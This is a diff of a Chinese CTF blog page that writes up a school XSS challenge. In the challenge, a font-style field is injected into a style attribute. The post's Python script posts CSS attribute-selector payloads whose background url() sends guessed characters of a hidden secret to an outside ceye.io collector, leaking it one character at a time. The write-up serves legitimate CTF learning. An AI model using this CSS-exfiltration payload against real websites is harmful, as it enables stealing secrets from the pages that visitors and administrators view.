@@ -79,18 +79,18 @@
 
 
 
-<meta name="description" content="继续是校赛题，这题我们进去看到一个留言框，然后题目提示写下建议，管理员会去看的，结合题目，确定是反射型xss了，尝试一下插入一下js语句进留言板，发现没反应，看下源码发现尖括号被转义了………emmm………看来想直接简单粗暴的利用是不行的了，继续回去上一页看一下，看见有个选择框，可以选择字体的样式，抓下包改下值成1212，发现在下一个页面的属性里面有1212………..嗯，这波操作有丶东西，属性里面的">
+<meta name="description" content="继续是校赛题，这题我们进去看到一个留言框，然后题目提示写下建议，管理员会去看的，结合题目，确定是反射型xss了，尝试一下插入一下js语句进留言板，发现没反应，看下源码发现尖括号被转义了………emmm………看来想直接简单粗暴的利用是不行的了，继续回去上一页看一下，看见有个选择框，可以选择字体的样式，抓下包改下值成1212，发现在下一个页面的style属性里面有1212………..嗯，这波操作有丶东西，">
 <meta name="keywords" content="xss">
 <meta property="og:type" content="article">
 <meta property="og:title" content="很简单的xss">
 <meta property="og:url" content="https://xi4or0uji.github.io/2019/01/17/2018-11-14-很简单的xss/index.html">
 <meta property="og:site_name" content="蒟蒻的ctf博客">
-<meta property="og:description" content="继续是校赛题，这题我们进去看到一个留言框，然后题目提示写下建议，管理员会去看的，结合题目，确定是反射型xss了，尝试一下插入一下js语句进留言板，发现没反应，看下源码发现尖括号被转义了………emmm………看来想直接简单粗暴的利用是不行的了，继续回去上一页看一下，看见有个选择框，可以选择字体的样式，抓下包改下值成1212，发现在下一个页面的属性里面有1212………..嗯，这波操作有丶东西，属性里面的">
+<meta property="og:description" content="继续是校赛题，这题我们进去看到一个留言框，然后题目提示写下建议，管理员会去看的，结合题目，确定是反射型xss了，尝试一下插入一下js语句进留言板，发现没反应，看下源码发现尖括号被转义了………emmm………看来想直接简单粗暴的利用是不行的了，继续回去上一页看一下，看见有个选择框，可以选择字体的样式，抓下包改下值成1212，发现在下一个页面的style属性里面有1212………..嗯，这波操作有丶东西，">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-01-17T08:33:16.725Z">
+<meta property="og:updated_time" content="2019-01-17T10:24:53.861Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="很简单的xss">
-<meta name="twitter:description" content="继续是校赛题，这题我们进去看到一个留言框，然后题目提示写下建议，管理员会去看的，结合题目，确定是反射型xss了，尝试一下插入一下js语句进留言板，发现没反应，看下源码发现尖括号被转义了………emmm………看来想直接简单粗暴的利用是不行的了，继续回去上一页看一下，看见有个选择框，可以选择字体的样式，抓下包改下值成1212，发现在下一个页面的属性里面有1212………..嗯，这波操作有丶东西，属性里面的">
+<meta name="twitter:description" content="继续是校赛题，这题我们进去看到一个留言框，然后题目提示写下建议，管理员会去看的，结合题目，确定是反射型xss了，尝试一下插入一下js语句进留言板，发现没反应，看下源码发现尖括号被转义了………emmm………看来想直接简单粗暴的利用是不行的了，继续回去上一页看一下，看见有个选择框，可以选择字体的样式，抓下包改下值成1212，发现在下一个页面的style属性里面有1212………..嗯，这波操作有丶东西，">
 
 
 
@@ -365,9 +365,9 @@
       
 
       
-        <p>继续是校赛题，这题我们进去看到一个留言框，然后题目提示写下建议，管理员会去看的，结合题目，确定是反射型xss了，尝试一下插入一下js语句进留言板，发现没反应，看下源码发现尖括号被转义了………<br>emmm………看来想直接简单粗暴的利用是不行的了，继续回去上一页看一下，看见有个选择框，可以选择字体的样式，抓下包改下值成1212，发现在下一个页面的<style>属性里面有1212………..<br>嗯，这波操作有丶东西，<style>属性里面的语句可控，就可以搞事情了，因为现在的浏览器版本比较高，尝试了一下直接利用js伪代码发现不行，只能一个个匹配然后弹回去自己的平台<br>最后脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">strs = <span class="string">"0123456789_qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"</span></span><br><span class="line">url = <span class="string">"http://laohulaohuhu.cn:32772/"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line">flag0 = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> strs:</span><br><span class="line">    flag = flag0 + ch</span><br><span class="line">    print(<span class="string">"trying "</span>+ flag)</span><br><span class="line">    key = &#123;<span class="string">'feedback'</span>:<span class="string">'111'</span>,<span class="string">'style'</span>:<span class="string">'#secret[value^="'</span> + flag + <span class="string">'"]&#123;background: url(\'http://abcdef.ceye.io/?xss='</span> + flag + <span class="string">'\');&#125;'</span>&#125;</span><br><span class="line">    r = requests.post(url=url,data=key)</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">print</span> flag</span><br><span class="line">        flag0 = flag</span><br><span class="line">print(flag0)</span><br></pre></td></tr></table></figure></p>
+        <p>继续是校赛题，这题我们进去看到一个留言框，然后题目提示写下建议，管理员会去看的，结合题目，确定是反射型xss了，尝试一下插入一下js语句进留言板，发现没反应，看下源码发现尖括号被转义了………<br>emmm………看来想直接简单粗暴的利用是不行的了，继续回去上一页看一下，看见有个选择框，可以选择字体的样式，抓下包改下值成1212，发现在下一个页面的style属性里面有1212………..<br>嗯，这波操作有丶东西，style属性里面的语句可控，就可以搞事情了，因为现在的浏览器版本比较高，尝试了一下直接利用js伪代码发现不行，只能一个个匹配然后弹回去自己的平台<br>最后脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">strs = <span class="string">"0123456789_qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"</span></span><br><span class="line">url = <span class="string">"http://laohulaohuhu.cn:32772/"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line">flag0 = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> strs:</span><br><span class="line">    flag = flag0 + ch</span><br><span class="line">    print(<span class="string">"trying "</span>+ flag)</span><br><span class="line">    key = &#123;<span class="string">'feedback'</span>:<span class="string">'111'</span>,<span class="string">'style'</span>:<span class="string">'#secret[value^="'</span> + flag + <span class="string">'"]&#123;background: url(\'http://abcdef.ceye.io/?xss='</span> + flag + <span class="string">'\');&#125;'</span>&#125;</span><br><span class="line">    r = requests.post(url=url,data=key)</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">print</span> flag</span><br><span class="line">        flag0 = flag</span><br><span class="line">print(flag0)</span><br></pre></td></tr></table></figure></p>
 <p>剩下的可以去自己的平台看一下有没有打到，flag也能出来了</p>
-</style></p>
+
       
     </div>
     
